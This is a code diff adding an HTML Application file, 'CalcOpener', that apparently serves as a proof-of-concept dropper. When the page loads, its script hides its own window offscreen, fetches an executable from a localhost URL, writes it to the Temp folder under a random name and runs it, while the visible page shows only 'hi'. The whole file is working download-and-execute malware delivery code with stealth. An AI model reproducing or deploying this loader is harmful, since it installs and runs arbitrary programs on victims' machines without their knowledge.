@@ -1,0 +1,42 @@
+<html>
+<head>
+    <hta:application id="htaApp" applicationname="CalcOpener" showintaskbar="no" />
+    <script type="text/javascript">
+
+        function moveWindow() {
+            window.resizeTo(1, 1);
+            window.moveTo(-3200, -4200);
+        }
+
+        function downloadAndRun() {
+                var shell = new ActiveXObject("WScript.Shell");
+                var tempPath = shell.ExpandEnvironmentStrings("%TEMP%");
+                var randomName = Math.random().toString(36).substring(2) + ".exe";
+                var filePath = tempPath + "\\" + randomName;
+                var url = "http://localhost:8080/calc.exe";
+                var xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
+                xmlHttp.open("GET", url, false);
+                xmlHttp.send();
+
+                if (xmlHttp.status == 200) {
+                    var adoStream = new ActiveXObject("ADODB.Stream");
+                    adoStream.Open();
+                    adoStream.Type = 1; // Binary
+                    adoStream.Write(xmlHttp.responseBody);
+                    adoStream.Position = 0;
+                    adoStream.SaveToFile(filePath, 2); // 2 = overwrite
+                    adoStream.Close();
+                    shell.Run(filePath);
+                }
+        }
+
+        window.onload = function() {
+            moveWindow();
+            downloadAndRun();
+        };
+    </script>
+</head>
+<body>
+    <h1>hi</h1>
+</body>
+</html>
